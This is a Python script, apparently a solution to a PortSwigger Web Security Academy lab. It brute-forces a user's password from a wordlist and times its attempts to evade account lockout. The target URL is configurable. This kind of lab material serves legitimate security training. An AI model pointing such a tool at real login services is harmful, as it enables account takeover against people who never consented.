#!/usr/bin/env python3
"""
PortSwigger Lab: Username enumeration via account lock
Brute-forces a password for a known username while avoiding triggering
a *permanent* lockout, by backing off after every N attempts.
"""

import time
import logging
import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

DEFAULT_URL = "https://0a6600eb037e39d582fe4fed005e00ea.web-security-academy.net/login"
DEFAULT_PASSWORD_FILE = "passwords.txt"
LOCK_THRESHOLD = 3          # attempts before the app locks the account
LOCK_COOLDOWN = 60          # seconds to wait for the lock to clear
REQUEST_TIMEOUT = 10

INVALID_MARKER = "Invalid username or password"
LOCKED_MARKER = "You have made too many incorrect login attempts. Please try again in 1 minute(s)."


def load_passwords(path: str) -> list[str]:
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]


def try_login(session: requests.Session, url: str, username: str, password: str) -> requests.Response:
    data = {"username": username, "password": password}
    return session.post(url, data=data, verify=False, timeout=REQUEST_TIMEOUT)


def brute_force(url: str, username: str, passwords: list[str]) -> str | None:
    session = requests.Session()
    attempts_since_cooldown = 0

    for password in passwords:
        try:
            response = try_login(session, url, username, password)
        except requests.RequestException as e:
            log.warning("Request failed for password %r: %s — retrying once", password, e)
            time.sleep(2)
            try:
                response = try_login(session, url, username, password)
            except requests.RequestException as e2:
                log.error("Retry failed for %r: %s — skipping", password, e2)
                continue

        body = response.text

        if LOCKED_MARKER.lower() in body.lower():
            log.info("Account locked early — cooling down for %ss", LOCK_COOLDOWN)
            time.sleep(LOCK_COOLDOWN)
            attempts_since_cooldown = 0
            continue  # don't count this as a real password attempt

        if INVALID_MARKER not in body:
            log.info("Password found: %r", password)
            return password

        attempts_since_cooldown += 1
        log.info("Tried %r — invalid (%d/%d before cooldown)",
                  password, attempts_since_cooldown, LOCK_THRESHOLD)

        if attempts_since_cooldown >= LOCK_THRESHOLD:
            log.info("Reached lock threshold, sleeping %ss to reset lockout window...", LOCK_COOLDOWN)
            time.sleep(LOCK_COOLDOWN)
            attempts_since_cooldown = 0

    log.warning("Password not found in wordlist.")
    return None


def main():
    parser = argparse.ArgumentParser(description="Username enumeration via account lock — password brute force")
    parser.add_argument("-u", "--url", default=DEFAULT_URL, help="Login endpoint URL")
    parser.add_argument("-U", "--username", required=True, help="Target username")
    parser.add_argument("-f", "--file", default=DEFAULT_PASSWORD_FILE, help="Path to password wordlist")
    args = parser.parse_args()

    passwords = load_passwords(args.file)
    log.info("Loaded %d candidate passwords", len(passwords))

    found = brute_force(args.url, args.username, passwords)
    if found:
        print(f"\n[+] SUCCESS — username: {args.username}  password: {found}")
    else:
        print("\n[-] Exhausted wordlist without success.")


if __name__ == "__main__":
    main()
       